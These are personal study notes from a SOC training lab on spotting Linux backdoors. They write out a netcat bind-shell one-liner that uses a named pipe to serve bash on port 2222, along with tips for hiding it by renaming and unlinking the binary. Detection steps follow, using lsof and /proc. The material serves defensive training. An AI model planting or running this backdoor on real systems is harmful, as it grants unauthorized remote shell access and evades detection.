---
{"dg-publish":true,"permalink":"/bhis-antisyphon-and-webinars/black-hills-soc-core/labs/bhis-socc-lab-linux-cli/"}
---

The Lab - [IntroClass/LinuxCLI](https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/Tools/IntroClass/LinuxCLI/LinuxCLI.md)
Section Notes - [[BHIS Antisyphon and Webinars/BlackHills SOC Core/Topics/SOCC02 - Linux\|SOCC02 - Linux]]
## Linux Lab
In this lab, we're investigating [[Definitions and Topics/backdoor\|backdoors]] on a [[Tool Deep-Dives/Linux\|Linux]] system.
1. get into su
	1. `sudo su -`
2. Create a fifo backpipe (?)
	1. `mknod backpipe p`
		1. [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) creates a system file with a specific name
3. Start the backpipe
	1. `/bin/bash 0<backpipe | nc -l 2222 1>backpipe`
		1. Basically creates a netcat listener that forwards all input through a backpipe and then into a bash session, and then passes the output back to the listener ([MITM](https://ccnadefinitions.com/ccna/20-definitions/mitm-on-path/))?
			1. `0` - standard input
			2. `1` - standard output
			3. `2` - error
		2. nc = netcat
			1. -l = listener
		3. For the backpipe, don't forget that *0* **<** *backpipe*, and *1* **>** *backpipe*
			1. `backpipe` does the reverse of a pipe
				1. netcat to backpipe, backpipe to bash, bash to netcat, etc...
				2. infinite loop
4. Look for network connection processes
	1. `lsof -i -P`
		1. `-i` is internet connections
		2. `-P` port number only (don't guess the service)
	2. This shows us the services that look strange; we can dig into a specific process with lowercase `-p`
		1. `lsof -p [process ID]`
		2. Shows everything associated with that particular PID
5. Investigate the process files
	1. `cd /proc/[pid]`
	2. `ls`
		1. Everything associated with the memory of the executable *as it resides in memory*
	3. `strings ./exe | less`
		1. Prints out all the shit that's in use
		2. If there's a program, with a man/page, you can scroll through with strings
6. Other ways to avoid detection
	1. Basically, rename netcat to notevil
	2. ![Day 2-1.png](/img/user/Attachments/Day%202-1.png)
		1. You could use a . to hide it (`.notevil`), but it's crazier to unlink it (i.e. program running in memory disconnected from program in storage)
			1. e.g., the program in storage was deleted
	3. If you delete the file (`rm notevil`) *while it's running*, it will continue to run *in memory*
	4. How to detect?
		1. `lsof +L1`
			1. Shows all system files running without any links
		2. once detected, you can `kill` or `pkill` to end the unlinked process, and kill its access
